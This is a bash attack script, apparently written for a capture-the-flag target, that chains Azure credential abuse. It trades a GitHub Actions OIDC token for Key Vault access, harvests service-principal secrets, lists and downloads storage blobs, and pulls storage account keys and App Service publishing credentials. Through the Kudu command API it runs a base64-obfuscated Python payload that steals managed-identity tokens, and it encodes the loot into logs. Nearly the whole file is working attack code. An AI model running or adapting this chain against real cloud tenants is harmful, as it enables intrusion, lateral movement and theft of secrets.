#!/usr/bin/env bash
set -euo pipefail
CID="${AZURE_CLIENT_ID:?}"
TID="${AZURE_TENANT_ID:?}"
PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'
SEC='https://kv-tbl-sec-x3euoz.vault.azure.net'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36'
say(){ echo "$*"; }
oauth(){ # $1 tenant, $2 appId, $3 secret
  curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$1/oauth2/v2.0/token" \
    -d "client_id=$2" -d 'grant_type=client_credentials' \
    -d "client_secret=$3" -d 'scope=https://vault.azure.net/.default'
}
if [[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]]; then say NO_OIDC; exit 0; fi
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
say "OIDC_SUB=$(echo "$J" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r .sub)"
BASE_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d "client_id=$CID" -d 'grant_type=client_credentials' \
  -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
  -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default')
BASE=$(echo "$BASE_R" | jq -r '.access_token // empty')
if [[ -z "$BASE" ]]; then say "BASE_FAIL $(echo "$BASE_R" | jq -c '{error,error_description}' 2>/dev/null || head -c 200 <<<"$BASE_R")"; exit 0; fi
say BASE_TOKEN_OK
LIST=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets?api-version=7.4")
say "PROD_NAMES_B64=$(printf '%s' "$LIST" | jq -r '[.value[]?.id|split("/")|last]|join(",")' | base64 -w0)"
for name in $(echo "$LIST" | jq -r '.value[]?.id | split("/") | last'); do
  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
  V=$(echo "$S" | jq -r '.value // empty')
  [[ -n "$V" ]] || { say "PROD_${name}_FAIL"; continue; }
  APPID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null || true)
  CSEC=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null || true)
  TEN=$(echo "$V" | jq -r '.tenantId // empty' 2>/dev/null || true)
  [[ -n "$APPID" && -n "$CSEC" && -n "$TEN" ]] || { say "PROD_${name}_NOT_SP"; continue; }
  R=$(oauth "$TEN" "$APPID" "$CSEC")
  AT=$(echo "$R" | jq -r '.access_token // empty')
  [[ -n "$AT" ]] || { say "SP_${name}_AUTH_FAIL"; continue; }
  say "SP_${name}_AUTH_OK"
  SL=$(curl -sS --max-time 20 -H "Authorization: Bearer $AT" "$SEC/secrets?api-version=7.4")
  say "SEC_${name}_NAMES_B64=$(printf '%s' "$SL" | jq -r '[.value[]?.id|split("/")|last]|join(",")' 2>/dev/null | base64 -w0)"
  # The SP may have get-only (no list) on the secret vault; try known names directly.
  for sn in flag FLAG flag-prod prod-flag ctf-flag tbl-flag the-flag dfcd master reporting-flag df26-flag; do
    H=$(curl -sS --max-time 15 -o /tmp/kv_$sn.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$SEC/secrets/$sn?api-version=7.4" || echo 000)
    F=$(jq -r '.value // empty' /tmp/kv_$sn.json 2>/dev/null || true)
    say "TRY_${name}_${sn}_HTTP=$H"
    if [[ -n "$F" ]]; then
      say "FLAG_NAME=$sn"
      say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
    fi
  done
  for sn in $(echo "$SL" | jq -r '.value[]?.id | split("/") | last' 2>/dev/null); do
    SV=$(curl -sS --max-time 20 -H "Authorization: Bearer $AT" "$SEC/secrets/$sn?api-version=7.4")
    F=$(echo "$SV" | jq -r '.value // empty')
    if [[ -n "$F" && ( "$sn" == "flag" || "$F" == DF26\{* ) ]]; then
      say "FLAG_NAME=$sn"; say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
    fi
  done
done

say STORAGE_PHASE
STOR_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token"   -d "client_id=$CID" -d 'grant_type=client_credentials'   -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer'   -d "client_assertion=$J" -d 'scope=https://storage.azure.com/.default')
STOK=$(echo "$STOR_R" | jq -r '.access_token // empty')
if [[ -z "$STOK" ]]; then say "STORAGE_TOKEN_FAIL"; else say STORAGE_TOKEN_OK; fi
for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttblcilogsprodx3euoz:logs' 'sttblarchiveprodx3euoz:'; do
  acc=${pair%%:*}; cont=${pair##*:}; [[ -n "$cont" ]] || continue
  base="https://$acc.blob.core.windows.net/$cont"
  LB=$(curl -sS --max-time 20 -H "Authorization: Bearer $STOK" -H 'x-ms-version: 2021-08-06' "$base?restype=container&comp=list")
  names=$(echo "$LB" | jq -r '.EnumerationResults.Blobs.Blob[]?.Name' 2>/dev/null || true)
  say "LIST_${acc}_${cont}_B64=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
  for bn in $names internal-config.json config.json flag flag.txt export.json credentials.json secrets.json; do
    [[ -n "$bn" ]] || continue
    url="$base/$bn"
    code=$(curl -sS --max-time 20 -o /tmp/blob.bin -w '%{http_code}' -H "Authorization: Bearer $STOK" -H 'x-ms-version: 2021-08-06' "$url" || echo 000)
    [[ "$code" == "200" ]] || continue
    txt=$(head -c 20000 /tmp/blob.bin | tr -d '\000')
    if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
      say "BLOB_${acc}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
    fi
  done
done
say STORAGE_END

say SP_STORAGE_PHASE
LIST2=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets?api-version=7.4")
for name in $(echo "$LIST2" | jq -r '.value[]?.id | split("/") | last'); do
  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
  V=$(echo "$S" | jq -r '.value // empty')
  APPID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null || true)
  CSEC=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null || true)
  TEN=$(echo "$V" | jq -r '.tenantId // empty' 2>/dev/null || true)
  [[ -n "$APPID" && -n "$CSEC" && -n "$TEN" ]] || continue
  ST2_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$APPID" -d 'grant_type=client_credentials' -d "client_secret=$CSEC" -d 'scope=https://storage.azure.com/.default')
  ST2=$(echo "$ST2_R" | jq -r '.access_token // empty')
  say "SP_STORAGE_${name}=$([[ -n "$ST2" ]] && echo OK || echo FAIL)"
  if [[ -n "$ST2" ]]; then
    for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttblcilogsprodx3euoz:logs'; do
      acc=${pair%%:*}; cont=${pair##*:}; base="https://$acc.blob.core.windows.net/$cont"
      LB=$(curl -sS --max-time 20 -H "Authorization: Bearer $ST2" -H 'x-ms-version: 2021-08-06' "$base?restype=container&comp=list")
      names=$(echo "$LB" | jq -r '.EnumerationResults.Blobs.Blob[]?.Name' 2>/dev/null || true)
      say "SPLIST_${name}_${acc}_${cont}=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
      for bn in $names internal-config.json config.json flag flag.txt export.json credentials.json secrets.json; do
        [[ -n "$bn" ]] || continue
        code=$(curl -sS --max-time 20 -o /tmp/sp_blob.bin -w '%{http_code}' -H "Authorization: Bearer $ST2" -H 'x-ms-version: 2021-08-06' "$base/$bn" || echo 000)
        [[ "$code" == "200" ]] || continue
        txt=$(head -c 20000 /tmp/sp_blob.bin | tr -d '\000')
        if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
          say "SPBLOB_${name}_${acc}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
        fi
      done
    done
  fi
  MT2_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$APPID" -d 'grant_type=client_credentials' -d "client_secret=$CSEC" -d 'scope=https://management.azure.com/.default')
  MT2=$(echo "$MT2_R" | jq -r '.access_token // empty')
  say "SP_ARM_${name}=$([[ -n "$MT2" ]] && echo OK || echo FAIL)"
  if [[ -n "$MT2" ]]; then
    RES=$(curl -sS --max-time 25 -H "Authorization: Bearer $MT2" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01")
    echo "$RES" | jq -r '.value[]? | select(.type=="Microsoft.Storage/storageAccounts") | [.name,.id] | @tsv' | while IFS=$'\t' read -r acct rid; do
      [[ -n "$acct" ]] || continue
      KEYS=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $MT2" -H 'Content-Length: 0' "https://management.azure.com${rid}/listKeys?api-version=2023-01-01")
      KEY=$(echo "$KEYS" | jq -r '.keys[0].value // empty' 2>/dev/null || true)
      [[ -n "$KEY" ]] || { say "SPKEY_${name}_${acct}=FAIL"; continue; }
      say "SPKEY_${name}_${acct}=OK"
      if command -v az >/dev/null 2>&1; then
        CS="DefaultEndpointsProtocol=https;AccountName=$acct;AccountKey=$KEY;EndpointSuffix=core.windows.net"
        for cont in config exports logs; do
          names=$(az storage blob list --connection-string "$CS" --container-name "$cont" --query '[].name' -o tsv --only-show-errors 2>/dev/null || true)
          say "AZLIST_${name}_${acct}_${cont}=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
          for bn in $names internal-config.json flag flag.txt export.json credentials.json; do
            [[ -n "$bn" ]] || continue
            az storage blob download --connection-string "$CS" --container-name "$cont" --name "$bn" --file /tmp/az_blob --no-progress --only-show-errors >/dev/null 2>&1 || continue
            txt=$(head -c 30000 /tmp/az_blob | tr -d '\000')
            if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
              say "AZBLOB_${name}_${acct}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
            fi
          done
        done
      fi
    done
  fi
done
say SP_STORAGE_END

say APPSERVICE_PHASE
FDID='60407ff3-1c24-4875-9390-b6c9c13b0821'
SCM='https://app-tbl-storefront-prod.scm.azurewebsites.net'
for name in $(echo "$LIST2" | jq -r '.value[]?.id | split("/") | last'); do
  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
  V=$(echo "$S" | jq -r '.value // empty')
  APPID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null || true); CSEC=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null || true); TEN=$(echo "$V" | jq -r '.tenantId // empty' 2>/dev/null || true)
  [[ -n "$APPID" && -n "$CSEC" && -n "$TEN" ]] || continue
  AR=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$APPID" -d 'grant_type=client_credentials' -d "client_secret=$CSEC" -d 'scope=https://appservice.azure.com/.default')
  AT=$(echo "$AR" | jq -r '.access_token // empty')
  say "APP_TOKEN_${name}=$([[ -n "$AT" ]] && echo OK || echo FAIL)"
  [[ -n "$AT" ]] || continue
  for path in /api/settings /api/env /api/processes /api/health /api/deployments /; do
    code=$(curl -sS --max-time 20 -o /tmp/kudu_body -w '%{http_code}' -H "Authorization: Bearer $AT" -H "X-Azure-FDID: $FDID" "$SCM$path" || echo 000)
    say "APP_${name}_${path//\//_}_HTTP=$code"
    if [[ "$code" == "200" ]]; then
      say "APP_${name}_${path//\//_}_B64=$(base64 -w0 </tmp/kudu_body)"
    fi
  done
done
say APPSERVICE_END

say REPORTING_PHASE
RPT_NAME='reporting-service-principal'
RPT_S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$RPT_NAME?api-version=7.4")
RPT_V=$(echo "$RPT_S" | jq -r '.value // empty')
RPT_ID=$(echo "$RPT_V" | jq -r '.appId // empty' 2>/dev/null || true)
RPT_SEC=$(echo "$RPT_V" | jq -r '.clientSecret // empty' 2>/dev/null || true)
RPT_TEN=$(echo "$RPT_V" | jq -r '.tenantId // empty' 2>/dev/null || true)
if [[ -n "$RPT_ID" && -n "$RPT_SEC" ]]; then
  RPT_ARM_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$RPT_TEN/oauth2/v2.0/token" -d "client_id=$RPT_ID" -d 'grant_type=client_credentials' -d "client_secret=$RPT_SEC" -d 'scope=https://management.azure.com/.default')
  RPT_ARM=$(echo "$RPT_ARM_R" | jq -r '.access_token // empty')
  say "RPT_ARM=$([[ -n "$RPT_ARM" ]] && echo OK || echo FAIL)"
  RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'
  APP_BASE="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP"
  PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RPT_ARM" -H 'Content-Length: 0' "$APP_BASE/config/publishingcredentials/list?api-version=2023-01-01")
  PUB_USER=$(echo "$PC" | jq -r '.properties.publishingUserName // empty' 2>/dev/null || true)
  PUB_PASS=$(echo "$PC" | jq -r '.properties.publishingPassword // empty' 2>/dev/null || true)
  say "PUB_CREDS_USER_SET=$([[ -n "$PUB_USER" ]] && echo yes || echo no) PASS_LEN=${#PUB_PASS}"
  if [[ -n "$PUB_USER" && -n "$PUB_PASS" ]]; then
    SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
    SET=$(curl -sS --max-time 20 -u "$PUB_USER:$PUB_PASS" "$SCM/api/settings")
    say "KUDU_SETTINGS_B64=$(printf '%s' "$SET" | base64 -w0)"
    ENVC=$(jq -nc '{command:"env | grep -E \"IDENTITY|MSI\" | sed -E \"s/=.*/=<set>/\"",dir:"/home/site/wwwroot"}')
    EK=$(curl -sS --max-time 20 -u "$PUB_USER:$PUB_PASS" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$ENVC")
    say "KUDU_ENVKEYS_B64=$(printf '%s' "$EK" | base64 -w0)"
    PYSRC=$(cat <<'PYEOF'
import os,json,urllib.request,base64
ie=os.environ.get('IDENTITY_ENDPOINT',''); ih=os.environ.get('IDENTITY_HEADER','')
if not ie or not ih:
    for p in ['/proc/1/environ','/proc/self/environ']:
        try:
            data=open(p,'rb').read().split(b'\0')
            d={}
            for x in data:
                if b'=' in x:
                    k,v=x.split(b'=',1); d[k.decode(errors='ignore')]=v.decode(errors='ignore')
            ie=ie or d.get('IDENTITY_ENDPOINT',''); ih=ih or d.get('IDENTITY_HEADER','')
        except Exception: pass
print('IDENTITY_ENDPOINT_SET', bool(ie), 'IDENTITY_HEADER_SET', bool(ih))
if not ie or not ih:
    raise SystemExit(0)
u=ie+'?resource=https://vault.azure.net&api-version=2019-08-01'
r=urllib.request.Request(u,headers={'X-IDENTITY-HEADER':ih})
tok=json.loads(urllib.request.urlopen(r,timeout=10).read()).get('access_token','')
print('MI_TOKEN_LEN',len(tok))
for vault in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
    for path in ['secrets?api-version=7.4','secrets/flag?api-version=7.4','secrets/FLAG?api-version=7.4']:
        try:
            q=urllib.request.Request(f'https://{vault}.vault.azure.net/{path}',headers={'Authorization':'Bearer '+tok})
            b=urllib.request.urlopen(q,timeout=10).read()
            print(vault,path,'HTTP',200,'B64',base64.b64encode(b).decode())
        except Exception as e:
            print(vault,path,'ERR',str(e)[:160])
PYEOF
)
    PYB64=$(printf '%s' "$PYSRC" | base64 -w0)
    CMD="python3 -c \"import base64;exec(base64.b64decode('$PYB64'))\""
    PYC=$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')
    PR=$(curl -sS --max-time 40 -u "$PUB_USER:$PUB_PASS" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$PYC")
    say "KUDU_PY_B64=$(printf '%s' "$PR" | base64 -w0)"
    say "KUDU_PY_HTTP_DONE"
  fi
else
  say RPT_SP_MISSING
fi
say REPORTING_END
say END
